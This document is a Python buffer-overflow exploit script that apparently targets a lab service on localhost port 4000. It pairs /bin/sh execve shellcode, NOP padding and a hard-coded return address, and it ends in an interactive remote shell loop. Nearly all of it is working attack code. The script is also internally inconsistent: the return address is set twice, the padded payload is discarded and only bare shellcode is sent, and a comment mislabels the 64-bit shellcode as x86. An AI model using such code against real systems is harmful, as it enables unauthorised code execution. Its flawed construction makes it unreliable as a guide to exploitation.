#!/usr/bin/env python3
import socket
import struct
import time

def pad_payload(payload: bytes, target_len: int) -> bytes:
    padding_len = target_len - len(payload)
    return payload + b"\x90" * padding_len
# Shellcode: execve("/bin/sh", NULL, NULL)
# This is a standard x86 Linux shellcode
shellcode=  b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
padding=    pad_payload(shellcode, 312)
returnAddr= b"\x68\x0E\x01\x76\xB7\x7C\x00\x00" #This is an example, we need a working return address to the global Buffer
returnAddr= b"\x00\x41\x40\x00\x00\x00\x00\x00"
payload = padding+returnAddr
def exploit():
    # Connect to the service
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 4000))
    
    # Receive the banner
    banner = s.recv(1024)
    print("Received banner")
    
    # Wait for "What is your name?" prompt
    prompt = s.recv(1024)
    print(f"Prompt: {prompt}")
    
    
    # Build the payload
    payload = shellcode
    
    
    # Send the payload
    print(f"Sending {len(payload)} bytes...")
    s.send(payload)
    
    # The shellcode should now be executing
    # Try to interact with the shell
    time.sleep(0.5)
    
    # Send commands to the shell
    try:
        s.send(b"id\n")
        response = s.recv(1024)
        print(f"Response: {response}")
        
        # If we get a shell, we can send more commands
        s.send(b"whoami\n")
        response = s.recv(1024)
        print(f"Response: {response}")
        
        # Keep the shell open
        print("Shell opened successfully! Type commands:")
        while True:
            cmd = input("$ ") + "\n"
            s.send(cmd.encode())
            response = s.recv(4096)
            print(response.decode(), end='')
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit()